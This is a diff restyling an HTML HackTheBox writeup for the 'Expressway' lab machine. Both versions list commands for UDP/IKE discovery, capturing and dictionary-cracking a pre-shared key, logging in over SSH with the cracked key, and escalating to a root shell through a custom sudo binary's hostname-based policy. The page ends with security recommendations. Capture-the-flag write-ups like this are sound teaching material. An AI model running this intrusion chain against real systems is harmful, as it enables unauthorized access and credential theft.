@@ -1,423 +1,349 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Expressway HTB Writeup</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Expressway HTB Writeup</title>
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-        }
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+<style>
+:root{
+  --bg:#12061f;
+  --bg2:#1b0930;
+  --purple:#6d28d9;
+  --magenta:#d946ef;
+  --cyan:#22d3ee;
+  --text:#e5e1f0;
+  --success:#22c55e;
+  --danger:#ef4444;
+  --warn:#facc15;
+}
 
-        .writeup-card {
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            overflow: hidden;
-            margin: 40px auto;
-        }
+*{box-sizing:border-box;margin:0;padding:0}
 
-        .header {
-            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
-            color: white;
-            padding: 40px;
-            text-align: center;
-        }
+body{
+  font-family:'Press Start 2P', monospace;
+  background:
+    linear-gradient(180deg,var(--bg),var(--bg2)),
+    repeating-linear-gradient(
+      90deg,
+      rgba(255,0,255,.03),
+      rgba(255,0,255,.03) 1px,
+      rgba(0,255,255,.03) 2px,
+      rgba(0,255,255,.03) 3px
+    );
+  color:var(--text);
+  min-height:100vh;
+  padding:40px 10px;
+  image-rendering:pixelated;
+}
 
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            font-weight: 300;
-        }
+/* CRT scanlines */
+body::before{
+  content:"";
+  position:fixed;
+  inset:0;
+  background:linear-gradient(
+    rgba(0,0,0,.18) 50%,
+    rgba(255,255,255,.05) 51%
+  );
+  background-size:100% 3px;
+  pointer-events:none;
+}
 
-        .header .subtitle {
-            font-size: 1.2em;
-            opacity: 0.9;
-            font-weight: 300;
-        }
+.container{
+  max-width:1100px;
+  margin:0 auto;
+}
 
-        .machine-info {
-            background: #f8f9fa;
-            padding: 20px;
-            border-bottom: 1px solid #e9ecef;
-        }
+.writeup-card{
+  background:rgba(0,0,0,.35);
+  border:2px solid rgba(109,40,217,.4);
+  box-shadow:
+    0 0 30px rgba(109,40,217,.35),
+    inset 0 0 20px rgba(217,70,239,.15);
+}
 
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-top: 10px;
-        }
+.header{
+  padding:32px;
+  border-bottom:1px solid var(--purple);
+}
 
-        .info-item {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            border-left: 4px solid #3498db;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
+.header h1{
+  font-size:16px;
+  color:var(--magenta);
+  margin-bottom:10px;
+}
 
-        .content {
-            padding: 40px;
-        }
+.subtitle{
+  font-size:9px;
+  color:var(--cyan);
+}
 
-        .section {
-            margin-bottom: 40px;
-        }
+.machine-info{
+  padding:20px;
+  background:rgba(0,0,0,.4);
+  border-bottom:1px solid rgba(255,255,255,.1);
+}
 
-        .section h2 {
-            color: #2c3e50;
-            border-bottom: 2px solid #3498db;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-            font-size: 1.8em;
-        }
+.machine-info h2{
+  font-size:11px;
+  color:var(--cyan);
+  margin-bottom:12px;
+}
 
-        .subsection {
-            margin-bottom: 25px;
-        }
+.info-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:12px;
+}
 
-        .subsection h3 {
-            color: #34495e;
-            margin-bottom: 10px;
-            font-size: 1.3em;
-        }
+.info-item{
+  background:#0b0215;
+  border:1px solid var(--purple);
+  padding:12px;
+  font-size:9px;
+}
 
-        .code-block {
-            background: #2c3e50;
-            color: #ecf0f1;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            overflow-x: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            line-height: 1.4;
-        }
+.content{padding:30px}
 
-        .finding {
-            background: #e8f4fd;
-            border-left: 4px solid #3498db;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 0 8px 8px 0;
-        }
+.section{margin-bottom:40px}
 
-        .success {
-            background: #d4edda;
-            border-left: 4px solid #28a745;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 0 8px 8px 0;
-        }
+.section h2{
+  font-size:12px;
+  color:var(--magenta);
+  border-bottom:1px solid var(--purple);
+  padding-bottom:10px;
+  margin-bottom:20px;
+}
 
-        .tools-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 15px;
-        }
+.subsection{margin-bottom:25px}
 
-        .tool-item {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid #e9ecef;
-            transition: transform 0.2s;
-        }
+.subsection h3{
+  font-size:10px;
+  color:var(--cyan);
+  margin-bottom:10px;
+}
 
-        .tool-item:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
+.code-block{
+  background:#0b0215;
+  border:1px solid var(--purple);
+  color:#f0abfc;
+  padding:14px;
+  margin:14px 0;
+  font-size:9px;
+  line-height:1.6;
+  white-space:pre-wrap;
+}
 
-        .recommendation {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 0 8px 8px 0;
-        }
+.finding,.success,.vulnerability,.recommendation{
+  background:rgba(255,255,255,.05);
+  padding:14px;
+  margin:14px 0;
+  border-left:3px solid;
+  font-size:9px;
+}
 
-        .footer {
-            background: #2c3e50;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            margin-top: 40px;
-        }
+.finding{border-color:var(--cyan)}
+.success{border-color:var(--success)}
+.vulnerability{border-color:var(--danger)}
+.recommendation{border-color:var(--warn)}
 
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-        }
-    </style>
+ul,ol{padding-left:20px}
+li{margin-bottom:8px}
+
+.tools-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+  gap:10px;
+}
+
+.tool-item{
+  background:#0b0215;
+  border:1px solid var(--purple);
+  padding:12px;
+  text-align:center;
+  font-size:9px;
+}
+
+.footer{
+  border-top:1px solid var(--purple);
+  padding:20px;
+  text-align:center;
+  font-size:8px;
+  color:#b7aacd;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="writeup-card">
-            <div class="header">
-                <h1>Expressway HTB Writeup</h1>
-                <div class="subtitle">HackTheBox Machine Walkthrough</div>
-            </div>
+<div class="container">
+<div class="writeup-card">
 
-            <div class="machine-info">
-                <h2>Machine Information</h2>
-                <div class="info-grid">
-                    <div class="info-item">
-                        <strong>Name:</strong> Expressway
-                    </div>
-                    <div class="info-item">
-                        <strong>IP:</strong> 10.10.11.87
-                    </div>
-                    <div class="info-item">
-                        <strong>Difficulty:</strong> Medium
-                    </div>
-                    <div class="info-item">
-                        <strong>OS:</strong> Linux
-                    </div>
-                </div>
-            </div>
+<div class="header">
+<h1>Expressway HTB Writeup</h1>
+<div class="subtitle">HackTheBox Machine Walkthrough</div>
+</div>
 
-            <div class="content">
-                <div class="section">
-                    <h2>Reconnaissance</h2>
-                    
-                    <div class="subsection">
-                        <h3>Initial Scan</h3>
-                        <div class="code-block">
-nmap -sC -sV 10.10.11.87
-                        </div>
-                        <div class="finding">
-                            <strong>Results:</strong> Only SSH port 22 open
-                        </div>
-                        <div class="code-block">
-22/tcp open  ssh     OpenSSH 10.0p2 Debian 8
-                        </div>
-                    </div>
+<div class="machine-info">
+<h2>Machine Information</h2>
+<div class="info-grid">
+  <div class="info-item"><strong>Name:</strong> Expressway</div>
+  <div class="info-item"><strong>IP:</strong> 10.10.11.87</div>
+  <div class="info-item"><strong>Difficulty:</strong> Medium</div>
+  <div class="info-item"><strong>OS:</strong> Linux</div>
+</div>
+</div>
 
-                    <div class="subsection">
-                        <h3>Comprehensive Scanning</h3>
-                        <div class="code-block">
-nmap -p- --min-rate 10000 10.10.11.87
-                        </div>
-                        <div class="finding">
-                            <strong>Results:</strong> Still only port 22 visible
-                        </div>
-                    </div>
+<div class="content">
 
-                    <div class="subsection">
-                        <h3>UDP Service Discovery</h3>
-                        <div class="code-block">
-./udpx -t 10.10.11.87 -c 128 -w 1000
-                        </div>
-                        <div class="success">
-                            <strong>Critical Finding:</strong> UDP port 500 (IKE service) discovered
-                        </div>
-                    </div>
-                </div>
+<div class="section">
+<h2>Reconnaissance</h2>
 
-                <div class="section">
-                    <h2>IKE Service Enumeration</h2>
-                    
-                    <div class="subsection">
-                        <h3>Aggressive Mode Handshake</h3>
-                        <div class="code-block">
-ike-scan -M -A 10.10.11.87
-                        </div>
-                        <div class="finding">
-                            <strong>Key Findings:</strong>
-                            <ul>
-                                <li>IKE service running on UDP 500</li>
-                                <li>Aggressive Mode enabled</li>
-                                <li>Domain: <code>expressway.htb</code></li>
-                                <li>Username: <code>ike</code></li>
-                                <li>Authentication: PSK (Pre-Shared Key)</li>
-                                <li>Encryption: 3DES with SHA1</li>
-                            </ul>
-                        </div>
-                    </div>
+<div class="subsection">
+<h3>Initial Scan</h3>
+<div class="code-block">nmap -sC -sV 10.10.11.87</div>
+<div class="finding">Results: Only SSH port 22 open</div>
+<div class="code-block">22/tcp open ssh OpenSSH 10.0p2 Debian 8</div>
+</div>
 
-                    <div class="subsection">
-                        <h3>PSK Extraction</h3>
-                        <div class="code-block">
-ike-scan -A --pskcrack 10.10.11.87 > ike_psk.txt
-                        </div>
-                    </div>
-                </div>
+<div class="subsection">
+<h3>Comprehensive Scanning</h3>
+<div class="code-block">nmap -p- --min-rate 10000 10.10.11.87</div>
+<div class="finding">Results: Still only port 22 visible</div>
+</div>
 
-                <div class="section">
-                    <h2>PSK Cracking</h2>
-                    
-                    <div class="subsection">
-                        <h3>Dictionary Attack</h3>
-                        <div class="code-block">
-psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.txt
-                        </div>
-                        <div class="success">
-                            <strong>Success:</strong> Found PSK <code>freakingrockstarontheroad</code>
-                        </div>
-                    </div>
-                </div>
+<div class="subsection">
+<h3>UDP Service Discovery</h3>
+<div class="code-block">./udpx -t 10.10.11.87 -c 128 -w 1000</div>
+<div class="success">Critical Finding: UDP port 500 (IKE service) discovered</div>
+</div>
+</div>
 
-                <div class="section">
-                    <h2>Initial Access</h2>
-                    
-                    <div class="subsection">
-                        <h3>SSH Connection</h3>
-                        <div class="code-block">
-ssh ike@10.10.11.87
-                        </div>
-                        <div class="finding">
-                            <strong>Password:</strong> <code>freakingrockstarontheroad</code>
-                        </div>
-                    </div>
+<div class="section">
+<h2>IKE Service Enumeration</h2>
 
-                    <div class="subsection">
-                        <h3>User Flag</h3>
-                        <div class="code-block">
-cat /home/ike/user.txt
-                        </div>
-                    </div>
-                </div>
+<div class="subsection">
+<h3>Aggressive Mode Handshake</h3>
+<div class="code-block">ike-scan -M -A 10.10.11.87</div>
+<div class="finding">
+<ul>
+<li>IKE service running on UDP 500</li>
+<li>Aggressive Mode enabled</li>
+<li>Domain: expressway.htb</li>
+<li>Username: ike</li>
+<li>Authentication: PSK</li>
+<li>Encryption: 3DES with SHA1</li>
+</ul>
+</div>
+</div>
 
-                <div class="section">
-                    <h2>Privilege Escalation</h2>
-                    
-                    <div class="subsection">
-                        <h3>Enumeration</h3>
-                        
-                        <div class="code-block">
-id
-                        </div>
-                        <div class="finding">
-                            <strong>Found:</strong> Member of <code>proxy</code> group
-                        </div>
+<div class="subsection">
+<h3>PSK Extraction</h3>
+<div class="code-block">ike-scan -A --pskcrack 10.10.11.87 &gt; ike_psk.txt</div>
+</div>
 
-                        <div class="code-block">
-find / -group proxy -type f 2>/dev/null
-cat /var/log/squid/access.log.1
-                        </div>
-                        <div class="success">
-                            <strong>Key Evidence:</strong> Found attempt to access <code>http://offramp.expressway.htb</code> through proxy
-                        </div>
+<div class="subsection">
+<h3>PSK Cracking</h3>
+<div class="code-block">psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.txt</div>
+<div class="success">Success: Found PSK freakingrockstarontheroad</div>
+</div>
+</div>
 
-                        <div class="finding">
-                            <strong>Custom Sudo Binary:</strong> Discovered custom sudo at <code>/usr/local/bin/sudo</code> with hostname-based policies
-                        </div>
-                    </div>
+<div class="section">
+<h2>Initial Access</h2>
+<div class="code-block">ssh ike@10.10.11.87</div>
+<div class="success">Password: freakingrockstarontheroad</div>
+<div class="code-block">cat /home/ike/user.txt</div>
+</div>
 
-                    <div class="subsection">
-                        <h3>Exploitation</h3>
-                        
-                        <div class="code-block">
-/usr/local/bin/sudo -h offramp.expressway.htb cat /root/root.txt
-                        </div>
-                        
-                        <div class="code-block">
-/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
-                        </div>
-                    </div>
+<div class="section">
+<h2>Privilege Escalation</h2>
 
-                    <div class="subsection">
-                        <h3>Root Flag</h3>
-                        <div class="code-block">
-cat /root/root.txt
-                        </div>
-                    </div>
-                </div>
+<div class="subsection">
+<h3>Enumeration</h3>
+<div class="code-block">id</div>
+<div class="finding">Found: Member of proxy group</div>
+<div class="code-block">find / -group proxy -type f 2&gt;/dev/null
+cat /var/log/squid/access.log.1</div>
+<div class="success">
+Key Evidence: Attempt to access http://offramp.expressway.htb
+</div>
+</div>
 
-                <div class="section">
-                    <h2>Key Attack Vectors</h2>
-                    <div class="finding">
-                        <ol>
-                            <li><strong>UDP Service Discovery:</strong> IKE service on UDP 500 was initially missed in TCP scans</li>
-                            <li><strong>Weak PSK:</strong> Pre-shared key vulnerable to dictionary attack</li>
-                            <li><strong>Hostname-Based Sudo Policy:</strong> Custom sudo binary trusted commands from internal host <code>offramp.expressway.htb</code></li>
-                            <li><strong>Proxy Group Access:</strong> Read access to proxy logs revealed internal hostname</li>
-                        </ol>
-                    </div>
-                </div>
+<div class="subsection">
+<h3>Exploitation</h3>
+<div class="finding">
+Custom sudo binary: /usr/local/bin/sudo with hostname-based policies
+</div>
+<div class="code-block">/usr/local/bin/sudo -h offramp.expressway.htb cat /root/root.txt
+/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash</div>
+<div class="success">Root Flag obtained</div>
+</div>
+</div>
 
-                <div class="section">
-                    <h2>Security Recommendations</h2>
-                    
-                    <div class="subsection">
-                        <h3>IKE Configuration</h3>
-                        <div class="recommendation">
-                            <ul>
-                                <li>Disable Aggressive Mode</li>
-                                <li>Use strong, unique PSK</li>
-                                <li>Implement certificate-based authentication</li>
-                            </ul>
-                        </div>
-                    </div>
+<div class="section">
+<h2>Key Attack Vectors</h2>
+<div class="finding">
+<ul>
+<li>UDP service discovery (IKE on 500)</li>
+<li>Weak PSK vulnerable to dictionary attack</li>
+<li>Hostname-based sudo trust</li>
+<li>Proxy log information disclosure</li>
+</ul>
+</div>
+</div>
 
-                    <div class="subsection">
-                        <h3>Sudo Security</h3>
-                        <div class="recommendation">
-                            <ul>
-                                <li>Avoid hostname-based trust policies</li>
-                                <li>Implement principle of least privilege</li>
-                                <li>Regular security audits of sudo configurations</li>
-                            </ul>
-                        </div>
-                    </div>
+<div class="section">
+<h2>Security Recommendations</h2>
 
-                    <div class="subsection">
-                        <h3>Access Control</h3>
-                        <div class="recommendation">
-                            <ul>
-                                <li>Restrict proxy log access</li>
-                                <li>Implement proper network segmentation</li>
-                                <li>Regular credential rotation</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
+<div class="recommendation">
+<strong>IKE Configuration</strong>
+<ul>
+<li>Disable Aggressive Mode</li>
+<li>Use strong PSK</li>
+<li>Use certificates</li>
+</ul>
+</div>
 
-                <div class="section">
-                    <h2>Tools Used</h2>
-                    <div class="tools-grid">
-                        <div class="tool-item">nmap</div>
-                        <div class="tool-item">udpx</div>
-                        <div class="tool-item">ike-scan</div>
-                        <div class="tool-item">psk-crack</div>
-                        <div class="tool-item">ssh</div>
-                    </div>
-                </div>
-            </div>
+<div class="recommendation">
+<strong>Sudo Security</strong>
+<ul>
+<li>Avoid hostname-based trust</li>
+<li>Least privilege</li>
+<li>Regular audits</li>
+</ul>
+</div>
 
-            <div class="footer">
-                <p>This machine demonstrated the importance of comprehensive UDP scanning and the risks of hostname-based authentication mechanisms in privilege escalation scenarios.</p>
-            </div>
-        </div>
-    </div>
+<div class="recommendation">
+<strong>Access Control</strong>
+<ul>
+<li>Restrict proxy logs</li>
+<li>Network segmentation</li>
+<li>Credential rotation</li>
+</ul>
+</div>
+</div>
+
+<div class="section">
+<h2>Tools Used</h2>
+<div class="tools-grid">
+<div class="tool-item">nmap</div>
+<div class="tool-item">udpx</div>
+<div class="tool-item">ike-scan</div>
+<div class="tool-item">psk-crack</div>
+<div class="tool-item">ssh</div>
+</div>
+</div>
+
+</div>
+
+<div class="footer">
+<p>cyberpunk before cyberpunk was cool</p>
+</div>
+
+</div>
+</div>
 </body>
 </html>
